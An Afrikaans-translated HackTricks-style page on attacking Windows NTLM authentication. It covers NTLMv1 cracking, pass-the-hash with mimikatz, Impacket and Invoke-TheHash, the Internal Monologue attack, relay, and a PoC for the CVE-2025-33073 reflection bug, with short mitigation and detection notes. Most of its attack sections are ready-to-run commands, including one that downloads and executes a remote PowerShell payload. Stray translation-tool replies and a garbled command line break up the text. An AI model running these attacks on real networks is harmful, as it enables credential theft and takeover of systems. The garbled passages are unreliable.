# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basiese Inligting

In omgewings waar **Windows XP en Server 2003** in werking is, word LM- (Lan Manager-) hashes gebruik, hoewel dit algemeen erken word dat hierdie hashes maklik gekompromitteer kan word. 'n Spesifieke LM-hash, `AAD3B435B51404EEAAD3B435B51404EE`, dui op 'n situasie waar LM nie gebruik word nie en verteenwoordig die hash vir 'n leë string.

By verstek is die **Kerberos**-authentication protocol die primêre metode wat gebruik word. NTLM (NT LAN Manager) tree onder spesifieke omstandighede in werking: wanneer Active Directory ontbreek, die domain nie bestaan nie, Kerberos weens verkeerde konfigurasie nie werk nie, of wanneer verbindings met 'n IP-adres eerder as 'n geldige hostname probeer word.

Die teenwoordigheid van die **"NTLMSSP"**-header in network packets dui op 'n NTLM-authentication process.

Ondersteuning vir die authentication protocols - LM, NTLMv1 en NTLMv2 - word deur 'n spesifieke DLL by `%windir%\Windows\System32\msv1\_0.dll` verskaf.

**Belangrike Punte**:

- LM-hashes is kwesbaar, en 'n leë LM-hash (`AAD3B435B51404EEAAD3B435B51404EE`) dui aan dat dit nie gebruik word nie.
- Kerberos is die verstek-authentication method, met NTLM wat slegs onder sekere omstandighede gebruik word.
- NTLM-authentication packets kan aan die "NTLMSSP"-header uitgeken word.
- LM-, NTLMv1- en NTLMv2-protocols word deur die system file `msv1\_0.dll` ondersteun.

## LM, NTLMv1 en NTLMv2

Jy kan nagaan en configureer watter protocol gebruik sal word:

### GUI

Voer _secpol.msc_ uit -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Daar is 6 vlakke (van 0 tot 5).

![LM, NTLMv1 en NTLMv2 - GUI: Voer secpol.msc uit - Local policies - Security Options - Network Security: LAN Manager authentication level. Daar is 6 vlakke (van 0 tot 5)](<../../images/image (919).png>)

### Register

Dit sal vlak 5 stel:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moontlike waardes:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basiese NTLM Domain authentication Scheme

1. Die **user** voer sy **credentials** in
2. Die client machine **sends an authentication request** met die **domain name** en die **username**
3. Die **server** stuur die **challenge**
4. Die **client encrypts** die **challenge** met die hash van die password as key en stuur dit as response
5. Die **server sends** aan die **Domain controller** die **domain name, die username, die challenge en die response**. Indien daar **nie** 'n Active Directory opgestel is nie of die domain name die naam van die server is, word die credentials **lokaal nagegaan**.
6. Die **domain controller checks if everything is correct** en stuur die inligting aan die server

Die **server** en die **Domain Controller** kan 'n **Secure Channel** via die **Netlogon** server skep, aangesien die Domain Controller die password van die server ken (dit is binne die **NTDS.DIT** db).

### Local NTLM authentication Scheme

Die authentication is soos die een wat **voorheen genoem is, maar** die **server** ken die **hash van die user** wat binne die **SAM** file probeer authenticate. Dus, in plaas daarvan om die Domain Controller te vra, sal die **server self nagaan** of die user kan authenticate.

### NTLMv1 Challenge

Die **challenge length is 8 bytes** en die **response is 24 bytes** lank.

Die **hash NT (16bytes)** word verdeel in **3 dele van 7bytes elk** (7B + 7B + (2B+0x00\*5)): die **laaste deel word met zeros gevul**. Daarna word die **challenge** afsonderlik met elke deel **ciphered** en die **resulterende** ciphered bytes word **saamgevoeg**. Totaal: 8B + 8B + 8B = 24Bytes.

**Problems**:

- Gebrek aan **randomness**
- Die 3 dele kan **afsonderlik aangeval** word om die NT hash te vind
- **DES is crackable**
- Die 3de key bestaan altyd uit **5 zeros**.
- Gegewe dieselfde **challenge**, sal die **response** dieselfde wees. Jy kan dus vir die victim die string "**1122334455667788**" as 'n **challenge** gee en die response aanval met **precomputed rainbow tables**.

### NTLMv1 attack

Deesdae word dit minder algemeen om environments met Unconstrained Delegation te vind, maar dit beteken nie dat jy nie 'n Print Spooler service wat opgestel is, kan **abuse** nie.

Jy kan sommige credentials/sessions wat jy reeds in die AD het, abuse om **die printer te vra om te authenticate** teenoor 'n **host onder jou beheer**. Daarna kan jy, met `metasploit auxiliary/server/capture/smb` of `responder`, die **authentication challenge op 1122334455667788 stel**, die authentication attempt capture, en as dit met **NTLMv1** gedoen is, sal jy dit kan **crack**.\
As jy `responder` gebruik, kan jy probeer om die **flag `--lm` te gebruik** om die **authentication** te probeer **downgrade**.\
_Noteer dat die authentication vir hierdie technique met NTLMv1 uitgevoer moet word (NTLMv2 is nie geldig nie)._

Onthou dat die printer die computer account tydens die authentication sal gebruik, en computer accounts gebruik **lang en random passwords** wat jy **waarskynlik nie sal kan crack** met algemene **dictionaries** nie. Die **NTLMv1** authentication **gebruik DES** ([more info here](#ntlmv1-challenge)), dus sal jy dit kan crack deur sommige services te gebruik wat spesifiek vir DES-cracking ontwerp is (jy kan byvoorbeeld [https://crack.sh/](https://crack.sh) of [https://ntlmv1.com/](https://ntlmv1.com) gebruik).

### NTLMv1 attack with hashcat

NTLMv1 kan ook gebreek word met die NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), wat NTLMv1 messages formateer op 'n manier wat met hashcat gebreek kan word.<sup>[[1]](#references)</sup>

Die command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Geen inhoud is verskaf om te vertaal nie.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to put in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Laat hashcat loop (verspreiding is die beste deur ’n tool soos hashtopolis); anders sal dit etlike dae neem.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In hierdie geval weet ons die wagwoord hiervoor is password, dus gaan ons kul vir demonstrasiedoeleindes:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ons moet nou die hashcat-utilities gebruik om die gekraakte des-sleutels na dele van die NTLM-hash om te skakel:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Plak asseblief die laaste gedeelte wat vertaal moet word.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the text or files you want me to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

Die **challenge-lengte is 8 grepe** en **2 responses word gestuur**: Een is **24 grepe** lank en die lengte van die **ander** is **veranderlik**.

**Die eerste response** word geskep deur die **string** wat deur die **client en die domain** saamgestel word, met **HMAC_MD5** te cipher en die **hash MD4** van die **NT hash** as **key** te gebruik. Vervolgens sal die **result** as **key** gebruik word om die **challenge** met **HMAC_MD5** te cipher. Hierby sal ’n **client challenge van 8 grepe** gevoeg word. Totaal: 24 B.

**Die tweede response** word geskep deur **verskeie waardes** te gebruik (’n nuwe client challenge, ’n **timestamp** om **replay attacks** te voorkom...)

As jy ’n **pcap het wat ’n suksesvolle authentication-proses vasgelê het**, kan jy hierdie gids volg om die domain, username, challenge en response te kry en probeer om die wagwoord te kraak: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Sodra jy die hash van die slagoffer het**, kan jy dit gebruik om dit te **impersonate**.\
Jy moet ’n **tool** gebruik wat die **NTLM authentication met** daardie **hash sal uitvoer**, **of** jy kan ’n nuwe **sessionlogon** skep en daardie **hash** binne die **LSASS** **inject**, sodat wanneer enige **NTLM authentication uitgevoer word**, daardie **hash gebruik sal word.** Die laaste opsie is wat mimikatz doen.

**Onthou asseblief dat jy Pass-the-Hash-attacks ook met Computer accounts kan uitvoer.**

### **Mimikatz**

**Moet as administrator uitgevoer word**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Dit sal 'n proses begin wat aan die gebruikers sal behoort wat mimikatz geloods het, maar intern in LSASS is die gestoorde credentials dié wat binne die mimikatz-parameters is. Daarna kan jy toegang tot network resources verkry asof jy daardie gebruiker is (soortgelyk aan die `runas /netonly`-trick, maar jy hoef nie die plain-text password te ken nie).

### Pass-the-Hash vanaf linux

Jy kan code execution op Windows-masjiene verkry deur Pass-the-Hash vanaf Linux te gebruik.\
[**Kry hier toegang om te leer hoe om dit te doen.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Jy kan [impacket binaries vir Windows hier aflaai](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In hierdie geval moet jy 'n command spesifiseer; cmd.exe en powershell.exe is nie geldig om 'n interactive shell te verkry nie)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Daar is verskeie ander Impacket binaries...

### Invoke-TheHash

Jy kan die powershell scripts hier kry: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Hierdie funksie is ’n **kombinasie van al die ander**. Jy kan **verskeie hosts** deurgee, **sommige uitsluit** en die **opsie** kies wat jy wil gebruik (_SMBExec, WMIExec, SMBClient, SMBEnum_). As jy **enige een van** **SMBExec** en **WMIExec** kies, maar **geen** _**Command**_-parameter gee nie, sal dit net **kontroleer** of jy **genoeg permissions** het.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Moet as administrator uitgevoer word**

Hierdie tool doen dieselfde as mimikatz (verander LSASS-geheue).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Handmatige Windows remote execution met username en password


{{#ref}}
../lateral-movement/
{{#endref}}

## Onttrekking van credentials vanaf ’n Windows Host

**Vir meer inligting oor** [**hoe om credentials vanaf ’n Windows host te verkry, moet jy hierdie bladsy lees**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

The Internal Monologue Attack is ’n stealthy credential extraction technique wat ’n aanvaller toelaat om NTLM hashes vanaf ’n slagoffer se masjien te verkry **sonder om direk met die LSASS process te kommunikeer**. Anders as Mimikatz, wat hashes direk uit memory lees en gereeld deur endpoint security solutions of Credential Guard geblokkeer word, gebruik hierdie attack **local calls na die NTLM authentication package (MSV1_0) via die Security Support Provider Interface (SSPI)**. Die aanvaller **downgrade eers NTLM settings** (bv. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) om te verseker dat NetNTLMv1 toegelaat word. Daarna impersonate hulle bestaande user tokens wat vanaf running processes verkry is en trigger hulle NTLM authentication lokaal om NetNTLMv1 responses te genereer deur ’n bekende challenge te gebruik.<sup>[[4]](#references)</sup>

Nadat hierdie NetNTLMv1 responses vasgelê is, kan die aanvaller vinnig die oorspronklike NTLM hashes herstel deur **precomputed rainbow tables** te gebruik, wat verdere Pass-the-Hash attacks vir lateral movement moontlik maak. Belangrik is dat die Internal Monologue Attack stealthy bly omdat dit nie network traffic genereer, code inject of direct memory dumps trigger nie, wat dit moeiliker maak vir defenders om op te spoor as tradisionele metodes soos Mimikatz.

As NetNTLMv1 nie aanvaar word nie—weens afgedwingde security policies—kan die aanvaller moontlik nie ’n NetNTLMv1 response verkry nie.

Om hierdie geval te hanteer, is die Internal Monologue tool opgedateer: Dit verkry dinamies ’n server token deur `AcceptSecurityContext()` te gebruik om steeds **NetNTLMv2 responses vas te lê** indien NetNTLMv1 faal. Hoewel NetNTLMv2 baie moeiliker is om te crack, skep dit steeds ’n moontlikheid vir relay attacks of offline brute-force in beperkte gevalle.

Die PoC kan gevind word by **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay en Responder

**Lees hier ’n meer gedetailleerde guide oor hoe om hierdie attacks uit te voer:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parse NTLM challenges from a network capture

**Jy kan** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **gebruik**

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows bevat verskeie mitigations wat probeer om *reflection* attacks te voorkom waar ’n NTLM- (of Kerberos-) authentication wat vanaf ’n host originate, terug na die **same** host gere-? word om SYSTEM privileges te verkry.

Microsoft het die meeste public chains gebreek met MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) en latere patches, maar **CVE-2025-33073** toon dat die protections steeds omseil kan word deur misbruik te maak van hoe die **SMB client Service Principal Names (SPNs) truncate** wat *marshalled* (serialized) target-info bevat.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR van die fout
1. ’n Aanvaller registreer ’n **DNS A-record** waarvan die label ’n marshalled SPN encodeer – bv.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Die slagoffer word gedwing om na daardie hostname te authenticate (PetitPotam, DFSCoerce, ens.).
3. Wanneer die SMB client die target string `cifs/srv11UWhRCAAAAA…` aan `lsasrv!LsapCheckMarshalledTargetInfo` deurgee, **strip** die call na `CredUnmarshalTargetInfo` die serialized blob, wat **`cifs/srv1`** agterlaat.
4. `msv1_0!SspIsTargetLocalhost` (of die Kerberos-ekwivalent) beskou die target nou as *localhost* omdat die kort host-deel met die computer name (`SRV1`) ooreenstem.
5. Gevolglik stel die server `NTLMSSP_NEGOTIATE_LOCAL_CALL` en inject dit **LSASS se SYSTEM access-token** in die context (vir Kerberos word ’n SYSTEM-marked subsession key geskep).
6. Deur daardie authentication met `ntlmrelayx.py` **of** `krbrelayx.py` te relay, verkry jy volledige SYSTEM rights op dieselfde host.<sup>[[5]](#references)</sup>

### Vinnige PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patches & Versagtings
* KB-patch vir **CVE-2025-33073** voeg 'n kontrole by `mrxsmb.sys::SmbCeCreateSrvCall` wat enige SMB-verbinding blokkeer waarvan die teiken gemarshalled info bevat (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Dwing **SMB signing** af om reflection te voorkom, selfs op ongepatchte hosts.
* Monitor DNS-rekords wat soos `*<base64>...*` lyk en blokkeer coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Opsporingsidees
* Network captures met `NTLMSSP_NEGOTIATE_LOCAL_CALL` waar client IP ≠ server IP.
* Kerberos AP-REQ wat 'n subsessie-sleutel bevat en waar 'n client principal gelyk is aan die hostname.
* Windows Event 4624/4648 SYSTEM-logons wat onmiddellik gevolg word deur remote SMB writes vanaf dieselfde host.<sup>[[5]](#references)</sup>

Vir die **Maart 2026** local reflection-variant wat **SMB arbitrary ports** en **TCP connection reuse** misbruik om `NT AUTHORITY\SYSTEM` te bereik, sien:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Verwysings
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Kraak 'n NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Verkryging van NTLM Hashes sonder om LSASS aan te raak](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
